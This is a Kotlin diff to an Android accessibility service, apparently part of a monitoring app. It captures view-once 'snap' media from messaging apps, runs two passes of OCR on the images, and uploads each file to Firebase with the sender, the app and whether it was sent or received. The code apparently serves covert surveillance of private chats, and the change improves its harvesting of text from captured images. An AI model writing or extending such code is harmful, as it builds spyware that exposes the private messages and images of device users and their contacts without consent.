@@ -934,61 +934,71 @@ class VyraAccessibilityService : AccessibilityService() {
         isOutgoing: Boolean
     ) {
         try {
+            val recognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())
             val ocrBitmap = preprocessBitmapForOcr(bitmap)
             val image = InputImage.fromBitmap(ocrBitmap, 0)
-            val recognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())
+
             recognizer.process(image)
                 .addOnSuccessListener { visionText ->
                     val ocrResult = visionText.text.trim()
                     if (ocrResult.isNotBlank()) {
-                        Log.i(AppConstants.TAG, "Devanagari/Latin ML Kit OCR recognized: $ocrResult")
+                        Log.i(AppConstants.TAG, "Devanagari/Latin ML Kit OCR recognized (Pass 1): $ocrResult")
+                        uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, ocrResult)
+                    } else {
+                        // Pass 2 Fallback: Check raw RGB bitmap for colored text or stickers
+                        val rawImage = InputImage.fromBitmap(bitmap, 0)
+                        recognizer.process(rawImage)
+                            .addOnSuccessListener { rawVisionText ->
+                                val rawResult = rawVisionText.text.trim()
+                                if (rawResult.isNotBlank()) {
+                                    Log.i(AppConstants.TAG, "Pass 2 (Raw RGB) OCR recognized: $rawResult")
+                                }
+                                uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, rawResult.ifBlank { null })
+                            }
+                            .addOnFailureListener {
+                                uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
+                            }
                     }
-                    val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
-                    val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
-                    syncManager.uploadMediaAndSyncChatMessage(
-                        msgId = msgId,
-                        app = sourceApp,
-                        sender = sender,
-                        text = titleText,
-                        mediaFile = snapFile,
-                        mediaType = "snap",
-                        isViewOnce = true,
-                        isIncoming = !isOutgoing,
-                        ocrText = ocrResult.ifBlank { null }
-                    )
                 }
                 .addOnFailureListener { e ->
-                    Log.w(AppConstants.TAG, "ML Kit OCR failed: ${e.message}")
-                    val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
-                    val msgId = "media_${System.currentTimeMillis()}"
-                    syncManager.uploadMediaAndSyncChatMessage(
-                        msgId = msgId,
-                        app = sourceApp,
-                        sender = sender,
-                        text = titleText,
-                        mediaFile = snapFile,
-                        mediaType = "snap",
-                        isViewOnce = true,
-                        isIncoming = !isOutgoing,
-                        ocrText = null
-                    )
+                    Log.w(AppConstants.TAG, "ML Kit Pass 1 OCR failed: ${e.message}, falling back to Pass 2")
+                    val rawImage = InputImage.fromBitmap(bitmap, 0)
+                    recognizer.process(rawImage)
+                        .addOnSuccessListener { rawVisionText ->
+                            val rawResult = rawVisionText.text.trim()
+                            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, rawResult.ifBlank { null })
+                        }
+                        .addOnFailureListener {
+                            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
+                        }
                 }
         } catch (e: Exception) {
             Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
-            val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
-            val msgId = "media_${System.currentTimeMillis()}"
-            syncManager.uploadMediaAndSyncChatMessage(
-                msgId = msgId,
-                app = sourceApp,
-                sender = sender,
-                text = titleText,
-                mediaFile = snapFile,
-                mediaType = "snap",
-                isViewOnce = true,
-                isIncoming = !isOutgoing,
-                ocrText = null
-            )
+            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
         }
+    }
+
+    private fun uploadSnapWithOcr(
+        sourceApp: String,
+        sender: String,
+        titleText: String,
+        snapFile: File,
+        isOutgoing: Boolean,
+        ocrText: String?
+    ) {
+        val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+        val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
+        syncManager.uploadMediaAndSyncChatMessage(
+            msgId = msgId,
+            app = sourceApp,
+            sender = sender,
+            text = titleText,
+            mediaFile = snapFile,
+            mediaType = "snap",
+            isViewOnce = true,
+            isIncoming = !isOutgoing,
+            ocrText = ocrText
+        )
     }
 
     override fun onDestroy() {
